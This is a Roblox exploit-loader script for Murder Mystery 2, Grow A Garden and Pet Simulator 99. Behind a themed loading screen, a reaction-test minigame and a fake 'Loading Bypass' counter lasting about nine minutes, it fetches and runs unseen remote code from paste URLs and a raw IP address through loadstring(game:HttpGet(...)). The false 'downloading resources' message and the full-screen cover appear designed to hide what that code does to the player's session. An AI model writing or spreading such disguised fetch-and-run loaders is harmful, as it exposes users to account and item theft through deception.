local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local placeId = game.PlaceId

-- Game info for themed loading screens
local gameInfo = {
    [142823291] = { -- Murder Mystery 2
        bgColor = Color3.fromRGB(255, 0, 0),
        title = "MURDER MYSTERY 2 🔪🩸",
        facts = {
            "MM2 was created by Nikilis in 2014.",
            "The most expensive knife ever sold cost over 500,000 seers.",
            "There are 3 main roles: Innocent, Sheriff, Murderer.",
            "The game was originally called 'Murder'."
        },
        script = "https://paste.debian.net/plainh/4c9365af/"
    },
    [126884695634066] = { -- Grow A Garden
        bgColor = Color3.fromRGB(0, 200, 0),
        title = "GROW A GARDEN 🐶🌱",
        facts = {
            "You can plant seeds and raise pets.",
            "The most expensive pet costs millions of coins.",
            "You can combine seeds to make rare plants.",
            "Some pets boost your farming speed."
        },
        script = function()
            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
            loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
        end
    },
    [8737899170] = { -- Pet Simulator 99
        bgColor = Color3.fromRGB(0, 100, 255),
        title = "PET SIMULATOR 99 🐾💎",
        facts = {
            "PS99 was released in 2023 by BIG Games.",
            "Some pets are worth billions of gems.",
            "Hatching eggs can give you huge pets.",
            "Trading Plaza is where players trade rare pets."
        },
        script = "https://paste.debian.net/plainh/f7e3fafa/"
    }
}

local gameData = gameInfo[placeId]

-- Executor detection
local executor = (identifyexecutor and identifyexecutor() or "Unknown")
executor = tostring(executor)

-- Executor warning GUI
local gui = Instance.new("ScreenGui")
gui.Name = "ExecutorWarningGUI"
gui.ResetOnSpawn = false
gui.Parent = CoreGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 200)
frame.Position = UDim2.new(0.5, -225, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(0,150,255)
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,-20,0,40)
title.Position = UDim2.new(0,10,0,10)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center
title.Parent = frame

local msg = Instance.new("TextLabel")
msg.Size = UDim2.new(1,-40,1,-100)
msg.Position = UDim2.new(0,20,0,60)
msg.BackgroundTransparency = 1
msg.TextWrapped = true
msg.TextXAlignment = Enum.TextXAlignment.Center
msg.TextYAlignment = Enum.TextYAlignment.Top
msg.Font = Enum.Font.Gotham
msg.TextColor3 = Color3.fromRGB(255,255,255)
msg.TextSize = 18
msg.Parent = frame

-- Discord copy button
local discordBtn = Instance.new("TextButton")
discordBtn.Size = UDim2.new(0,180,0,35)
discordBtn.Position = UDim2.new(0.5,-90,1,-70)
discordBtn.BackgroundColor3 = Color3.fromRGB(114,137,218)
discordBtn.Text = "Copy Discord Invite"
discordBtn.Font = Enum.Font.GothamBold
discordBtn.TextSize = 16
discordBtn.TextColor3 = Color3.fromRGB(255,255,255)
discordBtn.Parent = frame
Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0,6)

discordBtn.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/PZNK3DCrVQ")
    discordBtn.Text = "Copied!"
    task.delay(2,function() discordBtn.Text = "Copy Discord Invite" end)
end)

-- OK button
local okBtn = Instance.new("TextButton")
okBtn.Size = UDim2.new(0,140,0,35)
okBtn.Position = UDim2.new(0.5,-70,1,-25)
okBtn.BackgroundColor3 = Color3.fromRGB(0,120,255)
okBtn.Text = "OK!"
okBtn.TextColor3 = Color3.fromRGB(255,255,255)
okBtn.Font = Enum.Font.GothamBold
okBtn.TextSize = 18
okBtn.Parent = frame
Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0,6)

if string.find(string.lower(executor),"delta") then
    title.Text = "⚠️ DELTA USERS"
    title.TextColor3 = Color3.fromRGB(220,20,20)
    msg.Text = "Delta lacks TeleportService support.\nUse CODEX for full functionality.\nPress OK to continue."
else
    title.Text = "TO " .. string.upper(executor) .. " USERS!"
    title.TextColor3 = Color3.fromRGB(255,215,0)
    msg.Text = "Script requires 2-5 minutes to download resources.\nPress OK to continue."
end

-- Function to create loading screen
local function createLoadingScreen(info)
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "LoadingScreen"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.new(0,0,0)

    local titleLbl = Instance.new("TextLabel", bg)
    titleLbl.AnchorPoint = Vector2.new(0.5,0.5)
    titleLbl.Position = UDim2.new(0.5,0,0.35,0)
    titleLbl.Size = UDim2.new(0.9,0,0.15,0)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text = info.title
    titleLbl.TextColor3 = Color3.new(1,1,1)
    titleLbl.TextScaled = true
    titleLbl.Font = Enum.Font.GothamBlack

    local fact = Instance.new("TextLabel", bg)
    fact.AnchorPoint = Vector2.new(0.5,0)
    fact.Position = UDim2.new(0.5,0,0.85,0)
    fact.Size = UDim2.new(0.9,0,0.06,0)
    fact.BackgroundTransparency = 1
    fact.TextColor3 = Color3.fromRGB(200,200,200)
    fact.TextScaled = true
    fact.Font = Enum.Font.GothamBold

    task.spawn(function()
        local index = 1
        while gui.Parent do
            fact.Text = info.facts[index]
            index = (index % #info.facts) + 1
            task.wait(8)
        end
    end)

    -- Reaction test
    local reactionLabel = Instance.new("TextLabel", bg)
    reactionLabel.AnchorPoint = Vector2.new(0.5,0.5)
    reactionLabel.Position = UDim2.new(0.5,0,0.5,0)
    reactionLabel.Size = UDim2.new(0.6,0,0.08,0)
    reactionLabel.BackgroundTransparency = 1
    reactionLabel.TextColor3 = Color3.new(1,1,1)
    reactionLabel.Font = Enum.Font.GothamBlack
    reactionLabel.TextScaled = true
    reactionLabel.Text = ""

    local btn = Instance.new("TextButton", bg)
    btn.AnchorPoint = Vector2.new(0.5,0.5)
    btn.Position = UDim2.new(0.5,0,0.6,0)
    btn.Size = UDim2.new(0.3,0,0.08,0)
    btn.Text = "REACTION TEST"
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamBold
    btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
    btn.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,12)

    local reactionTimes = {}

    btn.MouseButton1Click:Connect(function()
        reactionLabel.Text = "WAIT FOR GREEN..."
        bg.BackgroundColor3 = Color3.fromRGB(200,0,0)
        task.delay(math.random(1,5), function()
            bg.BackgroundColor3 = info.bgColor
            local startTime = tick()
            local conn
            conn = bg.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    local rt = tick()-startTime
                    table.insert(reactionTimes,rt)
                    reactionLabel.Text = string.format("%.3f seconds",rt)
                    bg.BackgroundColor3 = Color3.new(0,0,0)
                    conn:Disconnect()
                end
            end)
        end)
    end)

    -- Loading bypass
    local bypass = Instance.new("TextLabel", bg)
    bypass.AnchorPoint = Vector2.new(0.5,0)
    bypass.Position = UDim2.new(0.5,0,0.9,0)
    bypass.Size = UDim2.new(0.5,0,0.05,0)
    bypass.BackgroundTransparency = 1
    bypass.TextColor3 = Color3.new(1,1,1)
    bypass.TextScaled = true
    bypass.Font = Enum.Font.GothamBold

    local maxBypass = 25200
    task.spawn(function()
        for i=0,maxBypass do
            bypass.Text = "Loading Bypass " .. i .. "/" .. maxBypass
            task.wait(540/ maxBypass)
        end
    end)

    return gui
end

-- OK button behavior
okBtn.MouseButton1Click:Connect(function()
    gui:Destroy()

    if gameData then
        createLoadingScreen(gameData)
        task.spawn(function()
            local ok, err = pcall(function()
                if typeof(gameData.script) == "function" then
                    gameData.script()
                else
                    loadstring(game:HttpGet(gameData.script,true))()
                end
            end)
            if not ok then warn("[Loader] Failed to run script:",err) end
        end)
    else
        warn("[Loader] No script for this PlaceId:",placeId)
    end
end)
